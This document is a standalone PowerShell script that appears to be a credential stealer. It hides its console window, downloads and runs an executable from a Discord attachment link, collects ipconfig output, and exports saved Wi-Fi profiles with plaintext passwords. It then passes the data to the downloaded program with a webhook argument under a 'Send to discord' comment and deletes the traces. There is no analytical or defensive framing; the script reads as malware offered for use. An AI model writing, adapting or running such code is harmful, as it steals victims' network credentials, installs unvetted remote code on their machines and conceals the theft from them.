Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)     

Invoke-WebRequest 'https://cdn.discordapp.com/attachments/975173196103966800/1436095963843526788/fun.exe?ex=690e5c17&is=690d0a97&hm=db4ddfcf8d3928eec1f6d3ae93576c5e149c03ecdc1672cd6c3a992f2e457265' -OutFile "$env:LOCALAPPDATA\Temp\fun.exe" ;

& "$env:LOCALAPPDATA\Temp\fun.exe"



$e = "$env:LOCALAPPDATA\Temp"
$zip = "$env:TEMP\funny_stuff_folder.zip"
ipconfig /all | Out-File "$e\ipcfg.txt"

while (-not (Test-Path $zip)) {
    Start-Sleep -Seconds 1
}

netsh wlan export profile key=clear folder=$e | Out-Null

$wifiFile = "$e\wifi.txt"
Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
    $x = [xml](Get-Content $_)
    $ssid = $x.WLANProfile.SSIDConfig.SSID.name
    $pass = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
}



# Send to discord

& "$env:LOCALAPPDATA\Temp\fun.exe" --wh $wh

# cleanup
cls
Start-Sleep -Seconds 3
Remove-Item -Path "$wifiFile" -Force
Remove-Item -Path "$e\ipcfg.txt" -Force
Remove-Item -Path "$zip" -Force
Remove-Item -Path "$env:LOCALAPPDATA\Temp\fun.exe" -Force


#exit quickly
#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
